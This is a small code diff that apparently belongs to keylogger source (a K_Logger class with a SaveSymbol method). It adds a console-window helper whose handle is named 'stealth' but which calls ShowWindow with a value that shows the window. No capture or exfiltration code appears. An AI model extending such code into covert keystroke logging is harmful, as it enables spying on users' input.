@@ -773,6 +773,14 @@ int K_Logger::SaveSymbol(WORD iKey)
 	return 0;
 }
 
+void VisibilityApp()
+{
+	HWND stealth;
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindow",NULL);
+	ShowWindow(stealth, 1);
+}
+
 
 int main()
 {
